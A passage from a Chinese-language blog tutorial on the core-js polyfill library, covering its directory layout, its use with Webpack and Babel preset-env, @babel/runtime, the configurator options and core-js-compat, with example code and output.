<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/actual"</span>);
<span class="hljs-keyword">const</span> arr = [
  { <span class="hljs-attr">group</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"jz"</span> },
  { <span class="hljs-attr">group</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"jz2"</span> },
  { <span class="hljs-attr">group</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"plp"</span> },
];
<span class="hljs-keyword">const</span> arrNew = arr.<span class="hljs-title function_">groupBy</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">group</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arrNew)
<span class="hljs-comment">/* 输出结果
[Object: null prototype] {
  '1': [ { group: 1, value: 'jz' }, { group: 1, value: 'plp' } ],
  '2': [ { group: 2, value: 'jz2' } ]
}
*/</span>

<span class="hljs-comment">// 引入core-js/stable</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/stable"</span>);
<span class="hljs-keyword">const</span> arr = [
  { <span class="hljs-attr">group</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"jz"</span> },
  { <span class="hljs-attr">group</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"jz2"</span> },
  { <span class="hljs-attr">group</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"plp"</span> },
];
<span class="hljs-keyword">const</span> arrNew = arr.<span class="hljs-title function_">groupBy</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">group</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arrNew)
<span class="hljs-comment">/* 输出结果
const arrNew = arr.groupBy(item =&gt; item.group);
                   ^
TypeError: arr.groupBy is not a function
*/</span>
</code></pre>
<p>可以看到，不引入core-js时不支持，引入了core-js/actual（包含stage3阶段的API）后支持并能输出正确的结果。core-js/stable中不支持又报错了。</p>
<h2 data-id="heading-6">core-js源码结构</h2>
<p>前面描述了很多core-js的引入方式，这里我们看一下源码结构，看看core-js内部是如何组织的。</p>
<h3 data-id="heading-7">core-js源码目录</h3>
<pre><code class="hljs language-erlang" lang="erlang">core-js
├─actual
│   ├─array
│   │  ├─at.js
│   │  ├─concat.js
│   │  └─...
│   ├─set
│   │  └─...
│   └─...
├─es
│   └─...
├─features
│   └─...
├─index.js
└─...
</code></pre>
<p>首先列出core-js源码目录的示意图，可以看到core-js内部有很多目录，对应前面的各种引入方式。这里我们列出每个目录的内容：</p>
<ul>
<li>actual 包含稳定的ES和Web标准特性，以及stage3的特性</li>
<li>es 包含稳定的ES特性</li>
<li>features 没有说明，猜测和full类似</li>
<li>full 所以特性包括早期提议</li>
<li>internals 包内部使用的逻辑</li>
<li>modules 实际特性的代码实现</li>
<li>proposals 包含提议的特性</li>
<li>stable 包含稳定的ES和Web标准特性</li>
<li>stage 按照stage阶段列出提议特性</li>
<li>web 包含Web标准特性</li>
<li>configurator.js 是否强制引入逻辑，后面会描述</li>
<li>index.js 内容为导出full目录，因此导入core-js等于导入core-js/full</li>
</ul>
<h3 data-id="heading-8">层层引用</h3>
<p>在目录中actual, es, full, stable, es是我们已经介绍过的。另外还有web目录仅包含web标准的特性，features和full类似（index.js中直接导出full目录）。</p>
<p>proposals目录包含提议的特性，以特性名来命名文件名。而stage目录中包含0.js, 1.js, 2.js等等，是根据stage阶段来整理的，方便整理和引入对应阶段的特性。</p>
<p>这样整理目录虽然清晰，但这些目录中的特性都是重复的，不可能在每个目录中把特性都实现一遍。因此上面这些目录的文件中，存放的都是实现的引用，并不是特性代码实现本身。真正的实现在modules目录中。modules目录中是以特性名作为命名的文件，文件有固定的前缀名：es.表示ES标准；esnext.表示提议中的标准；web.表示web标准。</p>
<p>这里以我们上面提到过的两个特性为例，看看引用路径，首先是Promise.try：</p>
<ul>
<li>使用者引入 core-js/full/promise/try.js</li>
<li>引入 actual/promise/try.js</li>
<li>引入 actual/promise/try.js</li>
<li>引入 stable/promise/try.js</li>
<li>引入 es/promise/try.js</li>
<li>最终引入 modules/es.promise.try.js</li>
</ul>
<p>然后是groupBy方法：</p>
<ul>
<li>使用者引入 core-js/actual/array/group-by.js</li>
<li>最终引入 modules/esnext.array.group-by.js</li>
</ul>
<p>可以看到，core-js内部的特性是经过层层引入，最终引入具体的实现代码的。</p>
<h3 data-id="heading-9">core-js-pure与core-js-bundle</h3>
<p>除了core-js之外，core-js-pure与core-js-bundle这两个包也提供了兼容性。core-js-pure内部的目录结构与core-js一致，只不过core-js-pure不将特性注入到全局。core-js-bundle比较特殊，它是将core-js代码经过打包后再提供，它的结构如下：</p>
<pre><code class="hljs language-arduino" lang="arduino">core-js-bundle
├─index.js
├─minified.js
├─minified.js.map
└─...
</code></pre>
<p>其中index.js是打包过后的特性集合代码，minified.js是经过压缩混淆后的代码。core-js-bundle只能全部引入并注入到全局，不能引入部分目录或者导出某个属性。</p>
<h2 data-id="heading-10">打包和浏览器效果</h2>
<h3 data-id="heading-11">创建Webpack示例</h3>
<p>首先创建一个Webapck项目，方便后续打包查看效果。首先执行：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建项目</span>
npm init -y
<span class="hljs-comment"># 安装webpack依赖</span>
npm add webpack webpack-cli html-webpack-plugin
<span class="hljs-comment"># 安装core-js依赖</span>
npm add core-js core-js-pure core-js-bundle
</code></pre>
<p>创建src/index.js，内容如下：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> arr = [<span class="hljs-string">"jz"</span>, <span class="hljs-string">"plp"</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">lastIndex</span>);
</code></pre>
<p>在package.json文件的scripts中增加命令："build": "webpack"。最后是Webpack配置文件webpack.config.js:</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title class_">HtmlWebpackPlugin</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">'html-webpack-plugin'</span>);

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">mode</span>: <span class="hljs-string">'production'</span>, <span class="hljs-comment">// 生产模式</span>
  <span class="hljs-attr">entry</span>: <span class="hljs-string">'./src/index.js'</span>, <span class="hljs-comment">// 源码入口</span>
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">HtmlWebpackPlugin</span>({ <span class="hljs-comment">// 生成HTML页面入口</span>
      <span class="hljs-attr">title</span>: <span class="hljs-string">'jzplp的core-js实验'</span>, <span class="hljs-comment">// 页面标题</span>
    }),
  ],
  <span class="hljs-attr">output</span>: {
    <span class="hljs-attr">filename</span>: <span class="hljs-string">'main.js'</span>, <span class="hljs-comment">// 生成文件名</span>
    <span class="hljs-attr">path</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'dist'</span>),  <span class="hljs-comment">// 生成文件目录</span>
    <span class="hljs-attr">clean</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 生成前删除dist目录内容</span>
  },
};
</code></pre>
<p>命令行运行npm run build，即可使用Webpack打包。在dist目录中生成了两个文件，一个是main.js，里面是打包后的js代码；index.html可以让我们在浏览器查看效果。由于我们没有引入core-js，浏览器没有预置lastIndex这个提议中的特性，因此输出undefined。</p>
<h3 data-id="heading-12">core-js打包</h3>
<p>这里引入core-js，然后打包查看效果。首先是全量引入：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js"</span>);
<span class="hljs-keyword">const</span> arr = [<span class="hljs-string">"jz"</span>, <span class="hljs-string">"plp"</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">lastIndex</span>);
</code></pre>
<p>此时浏览器输出1，表示core-js注入成功，lastIndex特性生效了。但是我们查看main.js，发现居然有267KB。这是因为它把所有特性都引入了。</p>
<p>如果引入<code>require("core-js/full/array")</code>，此时新特性也可以生效。因为只引入了数组相关特性，因此main.js的大小为59.3KB，比全量引入小很多。</p>
<p>如果引入<code>require("core-js/full/array/last-index")</code>，此时新特性也可以生效。因为只引入了这一个特性，因此main.js的大小为12.2KB。</p>
<h2 data-id="heading-13">Babel与core-js</h2>
<p>从前面打包的例子中可以看到，core-js整个打包进项目中是非常巨大的，可能比你正常项目的大小还要更大。这样明显会造成占用资源更多，页面加载时间变慢等问题。一个解决办法是，只引入我们代码中使用到的特性，以及我们要适配的浏览器版本中不兼容的特性，用不到的特性不打包进代码中。Babel就提供了这样的功能。</p>
<h3 data-id="heading-14">创建Babel示例</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建项目</span>
npm init -y
<span class="hljs-comment"># 安装webpack依赖</span>
npm add @babel/core @babel/cli @babel/preset-env
<span class="hljs-comment"># 安装core-js依赖</span>
npm add core-js core-js-pure core-js-bundle
</code></pre>
<p>创建src/index.js，内容如下：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js'</span>);
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-number">1</span>;
</code></pre>
<p>在package.json文件的scripts中增加命令："babel": "babel src --out-dir lib"。最后是Babel配置文件babel.config.json:</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"presets"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"@babel/preset-env"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"targets"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"chrome"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"100"</span>
        <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>targets中表示我们需要兼容的浏览器版本。执行npm run babel，生成结果再lib/index.js中，内容如下。可以看到未对core-js做任何处理。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-meta">"use strict"</span>;

<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js'</span>);
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-number">1</span>;
</code></pre>
<h3 data-id="heading-15">preset-env配置entry</h3>
<p>@babel/preset-env是一个Babel预设，可以根据配置为代码增加兼容性处理。前面创建Babel示例时已经增加了这个预设，但是没有增加core-js配置。这里我们加一下：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"presets"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"@babel/preset-env"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"targets"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"chrome"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"100"</span>
        <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"useBuiltIns"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"entry"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"corejs"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"3.47.0"</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>这里增加了corejs版本和useBuiltIns配置，值为entry。配置这个值，会使得@babel/preset-env根据配置的浏览器版本兼容性，选择引入哪些core-js中的特性。这里再执行命令行，结果如下：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-meta">"use strict"</span>;

<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.symbol.async-dispose.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.symbol.dispose.js"</span>);
<span class="hljs-comment">// ... 更多es特性省略</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/esnext.array.filter-out.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/esnext.array.filter-reject.js"</span>);
<span class="hljs-comment">// ... 更多esnext特性省略</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/web.dom-exception.stack.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/web.immediate.js"</span>);
<span class="hljs-comment">// ... 更多web特性省略</span>
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-number">1</span>;
</code></pre>
<p>可以看到core-js被拆开，直接引入了特性本身。在配置chrome: 100版本时，引入的特性为215个。我们修改配置chrome: 140版本时，再重新生成代码，此时引入的特性为150个。可以看到确实时根据浏览器版本选择不同的特性引入。这对于其它core-js的引入方式也生效：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 源代码</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/stable'</span>);
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-number">1</span>;

<span class="hljs-comment">// 生成代码</span>
<span class="hljs-meta">"use strict"</span>;

<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.symbol.async-dispose.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.symbol.dispose.js"</span>);
<span class="hljs-comment">// ... 更多es特性省略</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/web.dom-exception.stack.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/web.immediate.js"</span>);
<span class="hljs-comment">// ... 更多web特性省略</span>
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-number">1</span>;
</code></pre>
<p>我们引入core-js/stable，可以看到生成代码中不引入esnext特性了。在配置chrome: 100版本时，引入的特性为71个，配置chrome: 100版本时，引入的特性为6个。同样的，如果引入换成core-js/full/array，就会只引入数组相关特性，而且也是根据浏览器兼容版本引入。</p>
<h3 data-id="heading-16">preset-env配置usage</h3>
<p>@babel/preset-env的useBuiltIns配置值为usage时，Babel不仅会跟根据配置的浏览器版本兼容性，还会根据代码中实际使用的特性来选择引入哪些core-js中的特性。首先是Babel配置：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"presets"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"@babel/preset-env"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"targets"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"chrome"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"100"</span>
        <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"useBuiltIns"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"usage"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"corejs"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"3.47.0"</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>然后是要处理的代码，注意配置usage时是不需要手动引入core-js的。我们配置不同的Chrome浏览器版本，看看输出结果如何：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 源代码</span>
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();

<span class="hljs-comment">// chrome 50 生成代码 </span>
<span class="hljs-meta">"use strict"</span>;

<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.array.iterator.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.map.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.promise.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/web.dom-collections.iterator.js"</span>);
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();

<span class="hljs-comment">// chrome 100 生成代码 </span>
<span class="hljs-meta">"use strict"</span>;

<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
</code></pre>
<p>首先可以看到，引入core-js中的特性数量变得非常少了，代码中没有用到的特性不再引入。其次不同的浏览器版本引入的特性不一样，因此还是会根据浏览器兼容性引入特性。我们再修改一下源代码试试：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 源代码</span>
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span>{});

<span class="hljs-comment">// chrome 50 生成代码 </span>
<span class="hljs-meta">"use strict"</span>;

<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.array.iterator.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.map.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.promise.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.promise.try.js"</span>);
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/web.dom-collections.iterator.js"</span>);
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {});

<span class="hljs-comment">// chrome 100 生成代码 </span>
<span class="hljs-meta">"use strict"</span>;

<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/modules/es.promise.try.js"</span>);
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {});
</code></pre>
<p>可以看到，源代码中增加了Promise.try，引入的特性也随之增加了对应的core-js特性引入。因此，使用@babel/preset-env的usage配置，可以保证兼容性的同时，最小化引入core-js特性。另外这个配置并不会自动引入提议特性，如果需要则额外配置proposals为true。</p>
<h3 data-id="heading-17">@babel/polyfill</h3>
<p>@babel/polyfill是一个已经被弃用的包，推荐直接使用core-js/stable。查看@babel/polyfill源码，发现他就是引入了core-js特性与regenerator-runtime这个包。regenerator-runtime也是一个兼容性相关的包，可以帮助添加generatore和async/await相关语法。作为替代可以这样引入：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-string">'core-js/stable'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'regenerator-runtime/runtime'</span>;
</code></pre>
<h3 data-id="heading-18">@babel/runtime</h3>
<p>@babel/runtime就像自动引入版的core-js-pure。它还是根据代码实际使用的特性来注入core-js特性，但它不注入到全局，而是引入这些API再调用。这里我们使用@babel/plugin-transform-runtime插件，里面包含了@babel/runtime相关逻辑。首先看下Babel配置：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"plugins"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">[</span><span class="hljs-string">"@babel/plugin-transform-runtime"</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"corejs"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>再转义上一节中的代码，结果如下：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 源代码</span>
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span>{});

<span class="hljs-comment">// 生成代码</span>
<span class="hljs-keyword">import</span> _Promise <span class="hljs-keyword">from</span> <span class="hljs-string">"@babel/runtime-corejs3/core-js-stable/promise"</span>;
<span class="hljs-keyword">import</span> _Map <span class="hljs-keyword">from</span> <span class="hljs-string">"@babel/runtime-corejs3/core-js-stable/map"</span>;
<span class="hljs-keyword">const</span> jzplp = <span class="hljs-keyword">new</span> <span class="hljs-title function_">_Promise</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title function_">_Map</span>();
_Promise.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {});
</code></pre>
<p>可以看到，虽然没有直接引入core-js-pure，但效果是一样的。打开@babel/runtime-corejs3这个包查看，里面实际上就是导出了core-js-pure中的特性。例如：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// @babel/runtime-corejs3/core-js-stable/map.js 文件内容</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-pure/stable/map"</span>);
</code></pre>
<h2 data-id="heading-19">core-js/configurator强制控制</h2>
<p>如果希望在正常引入core-js时，对于部分特殊属性进行引入或者不引入的控制，就需要用到core-js/configurator。这个工具可以配置三种选项：</p>
<ul>
<li>useNative: 当环境中有这个特性时不引入，当确定没有时才引入</li>
<li>usePolyfill: 明确引入这个特性</li>
<li>useFeatureDetection: 默认行为，和不使用core-js/configurator一致</li>
</ul>
<h3 data-id="heading-20">useNative不引入</h3>
<p>首先试试不引入特性，这里我们使用Promise这个特性为例。首先是不引入core-js的效果，可以看到全局Promise对象被我们改掉了。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> jzplp = {};
<span class="hljs-title class_">Promise</span> = jzplp;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>, <span class="hljs-title class_">Promise</span> === jzplp);

<span class="hljs-comment">/* 输出结果
{} true
*/</span>
</code></pre>
<p>然后在中间引入core-js试试。可以看到我们改掉的Promise，被core-js给改回去了。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> jzplp = {};
<span class="hljs-title class_">Promise</span> = jzplp;
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/actual"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>, <span class="hljs-title class_">Promise</span> === jzplp);

<span class="hljs-comment">/* 输出结果
[Function: Promise] false
*/</span>
</code></pre>
<p>这时候，如果不希望core-js改掉我们自定义的Promise，可以利用useNative配置，强制core-js不引入这个特性。看结果core-js引入之后，我们自定义的Promise依然存在。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> configurator = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/configurator"</span>);
<span class="hljs-title function_">configurator</span>({
  <span class="hljs-attr">useNative</span>: [<span class="hljs-string">"Promise"</span>],
});
<span class="hljs-keyword">const</span> jzplp = {};
<span class="hljs-title class_">Promise</span> = jzplp;
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/actual"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>, <span class="hljs-title class_">Promise</span> === jzplp);

<span class="hljs-comment">/* 输出结果
{} true
*/</span>
</code></pre>
<h3 data-id="heading-21">usePolyfill强制引入</h3>
<p>想要验证usePolyfill的效果，需要找一个环境中本来存在的特性，core-js即使引入也不会修改的特性。Promise不行，因为core-js引入时会对这个Promise增加子特性。Promise.try也不行，因为原来环境中不存在。这里试一下Promise.any，这是环境中本来就存在的特性：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title function_">jzplp</span> = (<span class="hljs-params"/>) =&gt; {};
<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span> = jzplp;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span>, <span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span> === jzplp);

<span class="hljs-comment">/* 输出结果
[Function: any]
[Function: jzplp] true
*/</span>
</code></pre>
<p>可以看到，Promise.any原来就存在，但是被我们修改成了新函数。再引入core-js试试：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title function_">jzplp</span> = (<span class="hljs-params"/>) =&gt; {};
<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span> = jzplp;
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span>, <span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span> === jzplp);

<span class="hljs-comment">/* 输出结果
[Function: any]
[Function: jzplp] true
*/</span>
</code></pre>
<p>引入了core-js之后，结果没有变化。这说明core-js并不会修改我们自定义的函数。这时候就可以试一下usePolyfill的效果了：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> configurator = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/configurator"</span>);
<span class="hljs-title function_">configurator</span>({
  <span class="hljs-attr">usePolyfill</span>: [<span class="hljs-string">"Promise.any"</span>],
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title function_">jzplp</span> = (<span class="hljs-params"/>) =&gt; {};
<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span> = jzplp;
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span>, <span class="hljs-title class_">Promise</span>.<span class="hljs-property">any</span> === jzplp);

<span class="hljs-comment">/* 输出结果
[Function: any]
[Function: any] false
*/</span>
</code></pre>
<p>可以看到，Promise.any又被改为了真正起效果的函数，这说明usePolyfill的强制引入特性是有效的。</p>
<h2 data-id="heading-22">core-js中的特性选择</h2>
<p>前面我们体验了Babel根据浏览器兼容性，选择不同的core-js特性引入，那么不同浏览器兼容哪些特性的数据是从哪里获取呢？core-js本身就提供了这个功能。</p>
<h3 data-id="heading-23">core-js-compat</h3>
<p>core-js-compat提供了不同浏览器对应特性的兼容性数据。它有好几个参数，这里先列举一下含义：</p>
<ul>
<li>targets: Browserslist格式的浏览器兼容配置</li>
<li>modules: 需要设置兼容性配置的模块，可以是core-js/full，也可以是某个特性，甚至是正则</li>
<li>exclude: 需要排除的模块</li>
<li>version: 使用的core-js版本</li>
<li>inverse: 反向输出，即输出不需要兼容的特性列表</li>
</ul>
<p>这里举几个例子试一下：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> compat = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-compat"</span>);
<span class="hljs-keyword">const</span> data = <span class="hljs-title function_">compat</span>({
  <span class="hljs-attr">targets</span>: <span class="hljs-string">"&gt; 10%"</span>,
  <span class="hljs-attr">modules</span>: [<span class="hljs-string">"core-js/actual"</span>],
  <span class="hljs-attr">version</span>: <span class="hljs-string">"3.47"</span>,
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);

<span class="hljs-comment">/* 输出结果
{
  list: [
    'es.iterator.concat',
    'es.math.sum-precise',
    'es.async-iterator.async-dispose',
    'esnext.array.group',
    'esnext.array.group-by',
    ...其它特性
  ],
  targets: {
    'es.iterator.concat': { 'chrome-android': '143' },
    'es.math.sum-precise': { 'chrome-android': '143' },
    'es.async-iterator.async-dispose': { 'chrome-android': '143' },
    'esnext.array.group': { 'chrome-android': '143' },
    'esnext.array.group-by': { 'chrome-android': '143' },
    ...其它特性
  }
}
*/</span>
</code></pre>
